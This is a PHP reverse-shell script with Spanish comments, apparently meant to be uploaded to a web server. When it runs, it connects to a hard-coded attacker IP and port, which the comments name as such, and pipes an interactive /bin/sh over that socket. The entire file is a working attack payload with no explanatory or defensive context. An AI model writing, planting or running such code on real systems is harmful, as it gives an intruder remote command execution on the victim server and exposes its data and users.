<?php
// Configuración
$ip = "192.168.61.187";  // Reemplaza con la IP del atacante
$port = 6969;         // Reemplaza con el puerto en el que escuchas

// Crear un socket
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    die("Error en socket_create(): " . socket_strerror(socket_last_error()));
}

// Conectar al servidor
if (socket_connect($sock, $ip, $port) === false) {
    die("Error en socket_connect(): " . socket_strerror(socket_last_error($sock)));
}

// Redirigir la entrada/salida del shell al socket
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (is_resource($process)) {
    // Loop para la comunicación bidireccional
    while (true) {
        // Leer desde el socket y enviar al proceso
        $input = socket_read($sock, 2048);
        fwrite($pipes[0], $input);

        // Leer la salida del proceso y enviar al socket
        $output = fread($pipes[1], 2048);
        socket_write($sock, $output, strlen($output));
    }

    fclose($pipes[0]);
    fclose($pipes[1]);
    proc_close($process);
}

socket_close($sock);
?>
